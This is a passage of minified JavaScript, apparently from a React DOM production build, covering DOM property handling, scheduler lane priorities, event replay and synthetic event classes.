                    return F({}, t, {
                        value: void 0,
                        defaultValue: void 0,
                        children: "" + e._wrapperState.initialValue
                    })
                }

                function ie(e, t) {
                    var n = t.value;
                    if (null == n) {
                        if (n = t.children, t = t.defaultValue, null != n) {
                            if (null != t) throw Error(o(92));
                            if (te(n)) {
                                if (1 < n.length) throw Error(o(93));
                                n = n[0]
                            }
                            t = n
                        }
                        null == t && (t = ""), n = t
                    }
                    e._wrapperState = {
                        initialValue: q(n)
                    }
                }

                function oe(e, t) {
                    var n = q(t.value),
                        r = q(t.defaultValue);
                    null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r)
                }

                function ae(e) {
                    var t = e.textContent;
                    t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t)
                }

                function se(e) {
                    switch (e) {
                        case "svg":
                            return "http://www.w3.org/2000/svg";
                        case "math":
                            return "http://www.w3.org/1998/Math/MathML";
                        default:
                            return "http://www.w3.org/1999/xhtml"
                    }
                }

                function ce(e, t) {
                    return null == e || "http://www.w3.org/1999/xhtml" === e ? se(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e
                }
                var le, ue, de = (ue = function(e, t) {
                    if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t;
                    else {
                        for ((le = le || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = le.firstChild; e.firstChild;) e.removeChild(e.firstChild);
                        for (; t.firstChild;) e.appendChild(t.firstChild)
                    }
                }, "undefined" !== typeof MSApp && MSApp.execUnsafeLocalFunction ? function(e, t, n, r) {
                    MSApp.execUnsafeLocalFunction((function() {
                        return ue(e, t)
                    }))
                } : ue);

                function fe(e, t) {
                    if (t) {
                        var n = e.firstChild;
                        if (n && n === e.lastChild && 3 === n.nodeType) return void(n.nodeValue = t)
                    }
                    e.textContent = t
                }
                var he = {
                        animationIterationCount: !0,
                        aspectRatio: !0,
                        borderImageOutset: !0,
                        borderImageSlice: !0,
                        borderImageWidth: !0,
                        boxFlex: !0,
                        boxFlexGroup: !0,
                        boxOrdinalGroup: !0,
                        columnCount: !0,
                        columns: !0,
                        flex: !0,
                        flexGrow: !0,
                        flexPositive: !0,
                        flexShrink: !0,
                        flexNegative: !0,
                        flexOrder: !0,
                        gridArea: !0,
                        gridRow: !0,
                        gridRowEnd: !0,
                        gridRowSpan: !0,
                        gridRowStart: !0,
                        gridColumn: !0,
                        gridColumnEnd: !0,
                        gridColumnSpan: !0,
                        gridColumnStart: !0,
                        fontWeight: !0,
                        lineClamp: !0,
                        lineHeight: !0,
                        opacity: !0,
                        order: !0,
                        orphans: !0,
                        tabSize: !0,
                        widows: !0,
                        zIndex: !0,
                        zoom: !0,
                        fillOpacity: !0,
                        floodOpacity: !0,
                        stopOpacity: !0,
                        strokeDasharray: !0,
                        strokeDashoffset: !0,
                        strokeMiterlimit: !0,
                        strokeOpacity: !0,
                        strokeWidth: !0
                    },
                    pe = ["Webkit", "ms", "Moz", "O"];

                function me(e, t, n) {
                    return null == t || "boolean" === typeof t || "" === t ? "" : n || "number" !== typeof t || 0 === t || he.hasOwnProperty(e) && he[e] ? ("" + t).trim() : t + "px"
                }

                function ge(e, t) {
                    for (var n in e = e.style, t)
                        if (t.hasOwnProperty(n)) {
                            var r = 0 === n.indexOf("--"),
                                i = me(n, t[n], r);
                            "float" === n && (n = "cssFloat"), r ? e.setProperty(n, i) : e[n] = i
                        }
                }
                Object.keys(he).forEach((function(e) {
                    pe.forEach((function(t) {
                        t = t + e.charAt(0).toUpperCase() + e.substring(1), he[t] = he[e]
                    }))
                }));
                var ve = F({
                    menuitem: !0
                }, {
                    area: !0,
                    base: !0,
                    br: !0,
                    col: !0,
                    embed: !0,
                    hr: !0,
                    img: !0,
                    input: !0,
                    keygen: !0,
                    link: !0,
                    meta: !0,
                    param: !0,
                    source: !0,
                    track: !0,
                    wbr: !0
                });

                function ye(e, t) {
                    if (t) {
                        if (ve[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(o(137, e));
                        if (null != t.dangerouslySetInnerHTML) {
                            if (null != t.children) throw Error(o(60));
                            if ("object" !== typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(o(61))
                        }
                        if (null != t.style && "object" !== typeof t.style) throw Error(o(62))
                    }
                }

                function be(e, t) {
                    if (-1 === e.indexOf("-")) return "string" === typeof t.is;
                    switch (e) {
                        case "annotation-xml":
                        case "color-profile":
                        case "font-face":
                        case "font-face-src":
                        case "font-face-uri":
                        case "font-face-format":
                        case "font-face-name":
                        case "missing-glyph":
                            return !1;
                        default:
                            return !0
                    }
                }
                var we = null;

                function xe(e) {
                    return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e
                }
                var Ae = null,
                    ke = null,
                    Ee = null;

                function Se(e) {
                    if (e = bi(e)) {
                        if ("function" !== typeof Ae) throw Error(o(280));
                        var t = e.stateNode;
                        t && (t = xi(t), Ae(e.stateNode, e.type, t))
                    }
                }

                function Ce(e) {
                    ke ? Ee ? Ee.push(e) : Ee = [e] : ke = e
                }

                function _e() {
                    if (ke) {
                        var e = ke,
                            t = Ee;
                        if (Ee = ke = null, Se(e), t)
                            for (e = 0; e < t.length; e++) Se(t[e])
                    }
                }

                function Ie(e, t) {
                    return e(t)
                }

                function Pe() {}
                var Te = !1;

                function Be(e, t, n) {
                    if (Te) return e(t, n);
                    Te = !0;
                    try {
                        return Ie(e, t, n)
                    } finally {
                        Te = !1, (null !== ke || null !== Ee) && (Pe(), _e())
                    }
                }

                function Ne(e, t) {
                    var n = e.stateNode;
                    if (null === n) return null;
                    var r = xi(n);
                    if (null === r) return null;
                    n = r[t];
                    e: switch (t) {
                        case "onClick":
                        case "onClickCapture":
                        case "onDoubleClick":
                        case "onDoubleClickCapture":
                        case "onMouseDown":
                        case "onMouseDownCapture":
                        case "onMouseMove":
                        case "onMouseMoveCapture":
                        case "onMouseUp":
                        case "onMouseUpCapture":
                        case "onMouseEnter":
                            (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
                            break e;
                        default:
                            e = !1
                    }
                    if (e) return null;
                    if (n && "function" !== typeof n) throw Error(o(231, t, typeof n));
                    return n
                }
                var Oe = !1;
                if (u) try {
                    var Re = {};
                    Object.defineProperty(Re, "passive", {
                        get: function() {
                            Oe = !0
                        }
                    }), window.addEventListener("test", Re, Re), window.removeEventListener("test", Re, Re)
                } catch (ue) {
                    Oe = !1
                }

                function Me(e, t, n, r, i, o, a, s, c) {
                    var l = Array.prototype.slice.call(arguments, 3);
                    try {
                        t.apply(n, l)
                    } catch (u) {
                        this.onError(u)
                    }
                }
                var je = !1,
                    Fe = null,
                    Le = !1,
                    De = null,
                    He = {
                        onError: function(e) {
                            je = !0, Fe = e
                        }
                    };

                function Ue(e, t, n, r, i, o, a, s, c) {
                    je = !1, Fe = null, Me.apply(He, arguments)
                }

                function ze(e) {
                    var t = e,
                        n = e;
                    if (e.alternate)
                        for (; t.return;) t = t.return;
                    else {
                        e = t;
                        do {
                            0 !== (4098 & (t = e).flags) && (n = t.return), e = t.return
                        } while (e)
                    }
                    return 3 === t.tag ? n : null
                }

                function Ge(e) {
                    if (13 === e.tag) {
                        var t = e.memoizedState;
                        if (null === t && (null !== (e = e.alternate) && (t = e.memoizedState)), null !== t) return t.dehydrated
                    }
                    return null
                }

                function qe(e) {
                    if (ze(e) !== e) throw Error(o(188))
                }

                function Qe(e) {
                    return null !== (e = function(e) {
                        var t = e.alternate;
                        if (!t) {
                            if (null === (t = ze(e))) throw Error(o(188));
                            return t !== e ? null : e
                        }
                        for (var n = e, r = t;;) {
                            var i = n.return;
                            if (null === i) break;
                            var a = i.alternate;
                            if (null === a) {
                                if (null !== (r = i.return)) {
                                    n = r;
                                    continue
                                }
                                break
                            }
                            if (i.child === a.child) {
                                for (a = i.child; a;) {
                                    if (a === n) return qe(i), e;
                                    if (a === r) return qe(i), t;
                                    a = a.sibling
                                }
                                throw Error(o(188))
                            }
                            if (n.return !== r.return) n = i, r = a;
                            else {
                                for (var s = !1, c = i.child; c;) {
                                    if (c === n) {
                                        s = !0, n = i, r = a;
                                        break
                                    }
                                    if (c === r) {
                                        s = !0, r = i, n = a;
                                        break
                                    }
                                    c = c.sibling
                                }
                                if (!s) {
                                    for (c = a.child; c;) {
                                        if (c === n) {
                                            s = !0, n = a, r = i;
                                            break
                                        }
                                        if (c === r) {
                                            s = !0, r = a, n = i;
                                            break
                                        }
                                        c = c.sibling
                                    }
                                    if (!s) throw Error(o(189))
                                }
                            }
                            if (n.alternate !== r) throw Error(o(190))
                        }
                        if (3 !== n.tag) throw Error(o(188));
                        return n.stateNode.current === n ? e : t
                    }(e)) ? We(e) : null
                }

                function We(e) {
                    if (5 === e.tag || 6 === e.tag) return e;
                    for (e = e.child; null !== e;) {
                        var t = We(e);
                        if (null !== t) return t;
                        e = e.sibling
                    }
                    return null
                }
                var Ve = i.unstable_scheduleCallback,
                    Ze = i.unstable_cancelCallback,
                    Ke = i.unstable_shouldYield,
                    Je = i.unstable_requestPaint,
                    Ye = i.unstable_now,
                    Xe = i.unstable_getCurrentPriorityLevel,
                    $e = i.unstable_ImmediatePriority,
                    et = i.unstable_UserBlockingPriority,
                    tt = i.unstable_NormalPriority,
                    nt = i.unstable_LowPriority,
                    rt = i.unstable_IdlePriority,
                    it = null,
                    ot = null;
                var at = Math.clz32 ? Math.clz32 : function(e) {
                        return e >>>= 0, 0 === e ? 32 : 31 - (st(e) / ct | 0) | 0
                    },
                    st = Math.log,
                    ct = Math.LN2;
                var lt = 64,
                    ut = 4194304;

                function dt(e) {
                    switch (e & -e) {
                        case 1:
                            return 1;
                        case 2:
                            return 2;
                        case 4:
                            return 4;
                        case 8:
                            return 8;
                        case 16:
                            return 16;
                        case 32:
                            return 32;
                        case 64:
                        case 128:
                        case 256:
                        case 512:
                        case 1024:
                        case 2048:
                        case 4096:
                        case 8192:
                        case 16384:
                        case 32768:
                        case 65536:
                        case 131072:
                        case 262144:
                        case 524288:
                        case 1048576:
                        case 2097152:
                            return 4194240 & e;
                        case 4194304:
                        case 8388608:
                        case 16777216:
                        case 33554432:
                        case 67108864:
                            return 130023424 & e;
                        case 134217728:
                            return 134217728;
                        case 268435456:
                            return 268435456;
                        case 536870912:
                            return 536870912;
                        case 1073741824:
                            return 1073741824;
                        default:
                            return e
                    }
                }

                function ft(e, t) {
                    var n = e.pendingLanes;
                    if (0 === n) return 0;
                    var r = 0,
                        i = e.suspendedLanes,
                        o = e.pingedLanes,
                        a = 268435455 & n;
                    if (0 !== a) {
                        var s = a & ~i;
                        0 !== s ? r = dt(s) : 0 !== (o &= a) && (r = dt(o))
                    } else 0 !== (a = n & ~i) ? r = dt(a) : 0 !== o && (r = dt(o));
                    if (0 === r) return 0;
                    if (0 !== t && t !== r && 0 === (t & i) && ((i = r & -r) >= (o = t & -t) || 16 === i && 0 !== (4194240 & o))) return t;
                    if (0 !== (4 & r) && (r |= 16 & n), 0 !== (t = e.entangledLanes))
                        for (e = e.entanglements, t &= r; 0 < t;) i = 1 << (n = 31 - at(t)), r |= e[n], t &= ~i;
                    return r
                }

                function ht(e, t) {
                    switch (e) {
                        case 1:
                        case 2:
                        case 4:
                            return t + 250;
                        case 8:
                        case 16:
                        case 32:
                        case 64:
                        case 128:
                        case 256:
                        case 512:
                        case 1024:
                        case 2048:
                        case 4096:
                        case 8192:
                        case 16384:
                        case 32768:
                        case 65536:
                        case 131072:
                        case 262144:
                        case 524288:
                        case 1048576:
                        case 2097152:
                            return t + 5e3;
                        default:
                            return -1
                    }
                }

                function pt(e) {
                    return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0
                }

                function mt() {
                    var e = lt;
                    return 0 === (4194240 & (lt <<= 1)) && (lt = 64), e
                }

                function gt(e) {
                    for (var t = [], n = 0; 31 > n; n++) t.push(e);
                    return t
                }

                function vt(e, t, n) {
                    e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - at(t)] = n
                }

                function yt(e, t) {
                    var n = e.entangledLanes |= t;
                    for (e = e.entanglements; n;) {
                        var r = 31 - at(n),
                            i = 1 << r;
                        i & t | e[r] & t && (e[r] |= t), n &= ~i
                    }
                }
                var bt = 0;

                function wt(e) {
                    return 1 < (e &= -e) ? 4 < e ? 0 !== (268435455 & e) ? 16 : 536870912 : 4 : 1
                }
                var xt, At, kt, Et, St, Ct = !1,
                    _t = [],
                    It = null,
                    Pt = null,
                    Tt = null,
                    Bt = new Map,
                    Nt = new Map,
                    Ot = [],
                    Rt = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

                function Mt(e, t) {
                    switch (e) {
                        case "focusin":
                        case "focusout":
                            It = null;
                            break;
                        case "dragenter":
                        case "dragleave":
                            Pt = null;
                            break;
                        case "mouseover":
                        case "mouseout":
                            Tt = null;
                            break;
                        case "pointerover":
                        case "pointerout":
                            Bt.delete(t.pointerId);
                            break;
                        case "gotpointercapture":
                        case "lostpointercapture":
                            Nt.delete(t.pointerId)
                    }
                }

                function jt(e, t, n, r, i, o) {
                    return null === e || e.nativeEvent !== o ? (e = {
                        blockedOn: t,
                        domEventName: n,
                        eventSystemFlags: r,
                        nativeEvent: o,
                        targetContainers: [i]
                    }, null !== t && (null !== (t = bi(t)) && At(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== i && -1 === t.indexOf(i) && t.push(i), e)
                }

                function Ft(e) {
                    var t = yi(e.target);
                    if (null !== t) {
                        var n = ze(t);
                        if (null !== n)
                            if (13 === (t = n.tag)) {
                                if (null !== (t = Ge(n))) return e.blockedOn = t, void St(e.priority, (function() {
                                    kt(n)
                                }))
                            } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void(e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null)
                    }
                    e.blockedOn = null
                }

                function Lt(e) {
                    if (null !== e.blockedOn) return !1;
                    for (var t = e.targetContainers; 0 < t.length;) {
                        var n = Kt(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
                        if (null !== n) return null !== (t = bi(n)) && At(t), e.blockedOn = n, !1;
                        var r = new(n = e.nativeEvent).constructor(n.type, n);
                        we = r, n.target.dispatchEvent(r), we = null, t.shift()
                    }
                    return !0
                }

                function Dt(e, t, n) {
                    Lt(e) && n.delete(t)
                }

                function Ht() {
                    Ct = !1, null !== It && Lt(It) && (It = null), null !== Pt && Lt(Pt) && (Pt = null), null !== Tt && Lt(Tt) && (Tt = null), Bt.forEach(Dt), Nt.forEach(Dt)
                }

                function Ut(e, t) {
                    e.blockedOn === t && (e.blockedOn = null, Ct || (Ct = !0, i.unstable_scheduleCallback(i.unstable_NormalPriority, Ht)))
                }

                function zt(e) {
                    function t(t) {
                        return Ut(t, e)
                    }
                    if (0 < _t.length) {
                        Ut(_t[0], e);
                        for (var n = 1; n < _t.length; n++) {
                            var r = _t[n];
                            r.blockedOn === e && (r.blockedOn = null)
                        }
                    }
                    for (null !== It && Ut(It, e), null !== Pt && Ut(Pt, e), null !== Tt && Ut(Tt, e), Bt.forEach(t), Nt.forEach(t), n = 0; n < Ot.length; n++)(r = Ot[n]).blockedOn === e && (r.blockedOn = null);
                    for (; 0 < Ot.length && null === (n = Ot[0]).blockedOn;) Ft(n), null === n.blockedOn && Ot.shift()
                }
                var Gt = w.ReactCurrentBatchConfig,
                    qt = !0;

                function Qt(e, t, n, r) {
                    var i = bt,
                        o = Gt.transition;
                    Gt.transition = null;
                    try {
                        bt = 1, Vt(e, t, n, r)
                    } finally {
                        bt = i, Gt.transition = o
                    }
                }

                function Wt(e, t, n, r) {
                    var i = bt,
                        o = Gt.transition;
                    Gt.transition = null;
                    try {
                        bt = 4, Vt(e, t, n, r)
                    } finally {
                        bt = i, Gt.transition = o
                    }
                }

                function Vt(e, t, n, r) {
                    if (qt) {
                        var i = Kt(e, t, n, r);
                        if (null === i) qr(e, t, r, Zt, n), Mt(e, r);
                        else if (function(e, t, n, r, i) {
                                switch (t) {
                                    case "focusin":
                                        return It = jt(It, e, t, n, r, i), !0;
                                    case "dragenter":
                                        return Pt = jt(Pt, e, t, n, r, i), !0;
                                    case "mouseover":
                                        return Tt = jt(Tt, e, t, n, r, i), !0;
                                    case "pointerover":
                                        var o = i.pointerId;
                                        return Bt.set(o, jt(Bt.get(o) || null, e, t, n, r, i)), !0;
                                    case "gotpointercapture":
                                        return o = i.pointerId, Nt.set(o, jt(Nt.get(o) || null, e, t, n, r, i)), !0
                                }
                                return !1
                            }(i, e, t, n, r)) r.stopPropagation();
                        else if (Mt(e, r), 4 & t && -1 < Rt.indexOf(e)) {
                            for (; null !== i;) {
                                var o = bi(i);
                                if (null !== o && xt(o), null === (o = Kt(e, t, n, r)) && qr(e, t, r, Zt, n), o === i) break;
                                i = o
                            }
                            null !== i && r.stopPropagation()
                        } else qr(e, t, r, null, n)
                    }
                }
                var Zt = null;

                function Kt(e, t, n, r) {
                    if (Zt = null, null !== (e = yi(e = xe(r))))
                        if (null === (t = ze(e))) e = null;
                        else if (13 === (n = t.tag)) {
                        if (null !== (e = Ge(t))) return e;
                        e = null
                    } else if (3 === n) {
                        if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
                        e = null
                    } else t !== e && (e = null);
                    return Zt = e, null
                }

                function Jt(e) {
                    switch (e) {
                        case "cancel":
                        case "click":
                        case "close":
                        case "contextmenu":
                        case "copy":
                        case "cut":
                        case "auxclick":
                        case "dblclick":
                        case "dragend":
                        case "dragstart":
                        case "drop":
                        case "focusin":
                        case "focusout":
                        case "input":
                        case "invalid":
                        case "keydown":
                        case "keypress":
                        case "keyup":
                        case "mousedown":
                        case "mouseup":
                        case "paste":
                        case "pause":
                        case "play":
                        case "pointercancel":
                        case "pointerdown":
                        case "pointerup":
                        case "ratechange":
                        case "reset":
                        case "resize":
                        case "seeked":
                        case "submit":
                        case "touchcancel":
                        case "touchend":
                        case "touchstart":
                        case "volumechange":
                        case "change":
                        case "selectionchange":
                        case "textInput":
                        case "compositionstart":
                        case "compositionend":
                        case "compositionupdate":
                        case "beforeblur":
                        case "afterblur":
                        case "beforeinput":
                        case "blur":
                        case "fullscreenchange":
                        case "focus":
                        case "hashchange":
                        case "popstate":
                        case "select":
                        case "selectstart":
                            return 1;
                        case "drag":
                        case "dragenter":
                        case "dragexit":
                        case "dragleave":
                        case "dragover":
                        case "mousemove":
                        case "mouseout":
                        case "mouseover":
                        case "pointermove":
                        case "pointerout":
                        case "pointerover":
                        case "scroll":
                        case "toggle":
                        case "touchmove":
                        case "wheel":
                        case "mouseenter":
                        case "mouseleave":
                        case "pointerenter":
                        case "pointerleave":
                            return 4;
                        case "message":
                            switch (Xe()) {
                                case $e:
                                    return 1;
                                case et:
                                    return 4;
                                case tt:
                                case nt:
                                    return 16;
                                case rt:
                                    return 536870912;
                                default:
                                    return 16
                            }
                        default:
                            return 16
                    }
                }
                var Yt = null,
                    Xt = null,
                    $t = null;

                function en() {
                    if ($t) return $t;
                    var e, t, n = Xt,
                        r = n.length,
                        i = "value" in Yt ? Yt.value : Yt.textContent,
                        o = i.length;
                    for (e = 0; e < r && n[e] === i[e]; e++);
                    var a = r - e;
                    for (t = 1; t <= a && n[r - t] === i[o - t]; t++);
                    return $t = i.slice(e, 1 < t ? 1 - t : void 0)
                }

                function tn(e) {
                    var t = e.keyCode;
                    return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0
                }

                function nn() {
                    return !0
                }

                function rn() {
                    return !1
                }

                function on(e) {
                    function t(t, n, r, i, o) {
                        for (var a in this._reactName = t, this._targetInst = r, this.type = n, this.nativeEvent = i, this.target = o, this.currentTarget = null, e) e.hasOwnProperty(a) && (t = e[a], this[a] = t ? t(i) : i[a]);
                        return this.isDefaultPrevented = (null != i.defaultPrevented ? i.defaultPrevented : !1 === i.returnValue) ? nn : rn, this.isPropagationStopped = rn, this
                    }
                    return F(t.prototype, {
                        preventDefault: function() {
                            this.defaultPrevented = !0;
                            var e = this.nativeEvent;
                            e && (e.preventDefault ? e.preventDefault() : "unknown" !== typeof e.returnValue && (e.returnValue = !1), this.isDefaultPrevented = nn)
                        },
                        stopPropagation: function() {
                            var e = this.nativeEvent;
                            e && (e.stopPropagation ? e.stopPropagation() : "unknown" !== typeof e.cancelBubble && (e.cancelBubble = !0), this.isPropagationStopped = nn)
                        },
                        persist: function() {},
                        isPersistent: nn
                    }), t
                }
                var an, sn, cn, ln = {
                        eventPhase: 0,
                        bubbles: 0,
                        cancelable: 0,
                        timeStamp: function(e) {
                            return e.timeStamp || Date.now()
                        },
                        defaultPrevented: 0,
                        isTrusted: 0
                    },
                    un = on(ln),
                    dn = F({}, ln, {
                        view: 0,
                        detail: 0
                    }),
                    fn = on(dn),
                    hn = F({}, dn, {
                        screenX: 0,
                        screenY: 0,
                        clientX: 0,
                        clientY: 0,
                        pageX: 0,
                        pageY: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        altKey: 0,
                        metaKey: 0,
                        getModifierState: Sn,
                        button: 0,
                        buttons: 0,
                        relatedTarget: function(e) {
                            return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
                        },
                        movementX: function(e) {
                            return "movementX" in e ? e.movementX : (e !== cn && (cn && "mousemove" === e.type ? (an = e.screenX - cn.screenX, sn = e.screenY - cn.screenY) : sn = an = 0, cn = e), an)
                        },
                        movementY: function(e) {
                            return "movementY" in e ? e.movementY : sn
                        }
                    }),
                    pn = on(hn),
                    mn = on(F({}, hn, {
                        dataTransfer: 0
                    })),
                    gn = on(F({}, dn, {
                        relatedTarget: 0
                    })),
                    vn = on(F({}, ln, {
                        animationName: 0,
                        elapsedTime: 0,
                        pseudoElement: 0
                    })),
                    yn = F({}, ln, {
                        clipboardData: function(e) {
                            return "clipboardData" in e ? e.clipboardData : window.clipboardData
                        }
                    }),
                    bn = on(yn),
                    wn = on(F({}, ln, {
                        data: 0
                    })),
                    xn = {
                        Esc: "Escape",
                        Spacebar: " ",
                        Left: "ArrowLeft",
                        Up: "ArrowUp",
                        Right: "ArrowRight",
                        Down: "ArrowDown",
                        Del: "Delete",
                        Win: "OS",
                        Menu: "ContextMenu",
                        Apps: "ContextMenu",
                        Scroll: "ScrollLock",
                        MozPrintableKey: "Unidentified"
                    },
                    An = {
                        8: "Backspace",
                        9: "Tab",
                        12: "Clear",
                        13: "Enter",
                        16: "Shift",
                        17: "Control",
                        18: "Alt",
                        19: "Pause",
                        20: "CapsLock",
                        27: "Escape",
                        32: " ",
                        33: "PageUp",
                        34: "PageDown",
                        35: "End",
                        36: "Home",
                        37: "ArrowLeft",
                        38: "ArrowUp",
                        39: "ArrowRight",
                        40: "ArrowDown",
                        45: "Insert",
                        46: "Delete",
                        112: "F1",
                        113: "F2",
                        114: "F3",
                        115: "F4",
                        116: "F5",
                        117: "F6",
                        118: "F7",
                        119: "F8",
                        120: "F9",
                        121: "F10",
                        122: "F11",
                        123: "F12",
                        144: "NumLock",
                        145: "ScrollLock",
                        224: "Meta"
                    },
                    kn = {
                        Alt: "altKey",
                        Control: "ctrlKey",
                        Meta: "metaKey",
                        Shift: "shiftKey"
                    };

                function En(e) {
                    var t = this.nativeEvent;
                    return t.getModifierState ? t.getModifierState(e) : !!(e = kn[e]) && !!t[e]
                }

                function Sn() {
                    return En
                }
                var Cn = F({}, dn, {
                        key: function(e) {
                            if (e.key) {
                                var t = xn[e.key] || e.key;
                                if ("Unidentified" !== t) return t
                            }
                            return "keypress" === e.type ? 13 === (e = tn(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? An[e.keyCode] || "Unidentified" : ""
                        },
                        code: 0,
                        location: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        altKey: 0,
                        metaKey: 0,
                        repeat: 0,
                        locale: 0,
                        getModifierState: Sn,
                        charCode: function(e) {
                            return "keypress" === e.type ? tn(e) : 0
                        },
                        keyCode: function(e) {
                            return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                        },
                        which: function(e) {
                            return "keypress" === e.type ? tn(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                        }
                    }),
                    _n = on(Cn),
                    In = on(F({}, hn, {
                        pointerId: 0,
                        width: 0,
                        height: 0,
                        pressure: 0,
                        tangentialPressure: 0,
                        tiltX: 0,
                        tiltY: 0,
                        twist: 0,
                        pointerType: 0,
                        isPrimary: 0
                    })),
                    Pn = on(F({}, dn, {
                        touches: 0,
                        targetTouches: 0,
                        changedTouches: 0,
                        altKey: 0,
                        metaKey: 0,
                        ctrlKey: 0,
                        shiftKey: 0,
                        getModifierState: Sn
                    })),
                    Tn = on(F({}, ln, {
                        propertyName: 0,
                        elapsedTime: 0,
                        pseudoElement: 0
                    })),
                    Bn = F({}, hn, {
                        deltaX: function(e) {
                            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
                        },
                        deltaY: function(e) {
                            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
                        },
                        deltaZ: 0,
                        deltaMode: 0
                    }),
                    Nn = on(Bn),
                    On = [9, 13, 27, 32],
                    Rn = u && "CompositionEvent" in window,
                    Mn = null;
                u && "documentMode" in document && (Mn = document.documentMode);
                var jn = u && "TextEvent" in window && !Mn,
                    Fn = u && (!Rn || Mn && 8 < Mn && 11 >= Mn),
                    Ln = String.fromCharCode(32),
                    Dn = !1;

                function Hn(e, t) {
                    switch (e) {
                        case "keyup":
                            return -1 !== On.indexOf(t.keyCode);
                        case "keydown":
                            return 229 !== t.keyCode;
                        case "keypress":
                        case "mousedown":
                        case "focusout":
                            return !0;
                        default:
                            return !1
                    }
                }

                function Un(e) {
                    return "object" === typeof(e = e.detail) && "data" in e ? e.data : null
                }
                var zn = !1;
                var Gn = {
                    color: !0,
                    date: !0,
                    datetime: !0,
                    "datetime-local": !0,
                    email: !0,
                    month: !0,
                    number: !0,
                    password: !0,
                    range: !0,
                    search: !0,
                    tel: !0,
                    text: !0,
                    time: !0,
                    url: !0,
                    week: !0
                };

                function qn(e) {
                    var t = e && e.nodeName && e.nodeName.toLowerCase();
                    return "input" === t ? !!Gn[e.type] : "textarea" === t
                }

                function Qn(e, t, n, r) {
                    Ce(r), 0 < (t = Wr(t, "onChange")).length && (n = new un("onChange", "change", null, n, r), e.push({
                        event: n,
                        listeners: t
                    }))
                }
                var Wn = null,
                    Vn = null;

                function Zn(e) {
                    Lr(e, 0)
                }

                function Kn(e) {
                    if (V(wi(e))) return e
                }

                function Jn(e, t) {
                    if ("change" === e) return t
                }
                var Yn = !1;
                if (u) {
                    var Xn;
                    if (u) {
                        var $n = "oninput" in document;
                        if (!$n) {
                            var er = document.createElement("div");
                            er.setAttribute("oninput", "return;"), $n = "function" === typeof er.oninput
                        }
                        Xn = $n
                    } else Xn = !1;
                    Yn = Xn && (!document.documentMode || 9 < document.documentMode)
                }

                function tr() {
                    Wn && (Wn.detachEvent("onpropertychange", nr), Vn = Wn = null)
                }

                function nr(e) {
                    if ("value" === e.propertyName && Kn(Vn)) {
                        var t = [];
                        Qn(t, Vn, e, xe(e)), Be(Zn, t)
                    }
                }

                function rr(e, t, n) {
                    "focusin" === e ? (tr(), Vn = n, (Wn = t).attachEvent("onpropertychange", nr)) : "focusout" === e && tr()
                }

                function ir(e) {
                    if ("selectionchange" === e || "keyup" === e || "keydown" === e) return Kn(Vn)
                }

                function or(e, t) {
                    if ("click" === e) return Kn(t)
                }

                function ar(e, t) {
                    if ("input" === e || "change" === e) return Kn(t)
                }
                var sr = "function" === typeof Object.is ? Object.is : function(e, t) {
                    return e === t && (0 !== e || 1 / e === 1 / t) || e !== e && t !== t
                };

                function cr(e, t) {
                    if (sr(e, t)) return !0;
                    if ("object" !== typeof e || null === e || "object" !== typeof t || null === t) return !1;
                    var n = Object.keys(e),
                        r = Object.keys(t);
                    if (n.length !== r.length) return !1;
                    for (r = 0; r < n.length; r++) {
                        var i = n[r];
                        if (!d.call(t, i) || !sr(e[i], t[i])) return !1
                    }
                    return !0
                }

                function lr(e) {
                    for (; e && e.firstChild;) e = e.firstChild;
                    return e
                }

                function ur(e, t) {
                    var n, r = lr(e);
                    for (e = 0; r;) {
                        if (3 === r.nodeType) {
                            if (n = e + r.textContent.length, e <= t && n >= t) return {
                                node: r,
                                offset: t - e
                            };
                            e = n
                        }
                        e: {
                            for (; r;) {
                                if (r.nextSibling) {
                                    r = r.nextSibling;
                                    break e
                                }
                                r = r.parentNode
                            }
                            r = void 0
                        }
                        r = lr(r)
                    }
                }

                function dr(e, t) {
                    return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? dr(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))))
                }

                function fr() {
                    for (var e = window, t = Z(); t instanceof e.HTMLIFrameElement;) {
                        try {
                            var n = "string" === typeof t.contentWindow.location.href
                        } catch (r) {
                            n = !1
                        }
                        if (!n) break;
